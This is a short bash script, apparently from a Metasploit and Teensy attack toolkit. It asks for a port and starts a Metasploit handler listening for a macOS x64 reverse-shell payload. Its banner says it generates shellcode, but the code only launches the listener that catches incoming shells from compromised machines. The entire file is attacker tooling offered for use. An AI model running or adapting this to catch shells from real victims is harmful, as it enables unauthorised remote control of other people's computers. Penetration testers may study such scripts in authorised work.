#!/bin/bash
clear
echo "***************************************************************"
echo "       Automatic  shellcode generator - FOR METASPLOIT         "
echo "       For Automatic Teensy programming and deployment         "
echo "***************************************************************"
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo "      starting the meterpreter listener.."
./msfcli exploit/multi/handler  PAYLOAD=osx/x64/shell_reverse_tcp   LHOST=127.0.0.1 LPORT=$port  E 
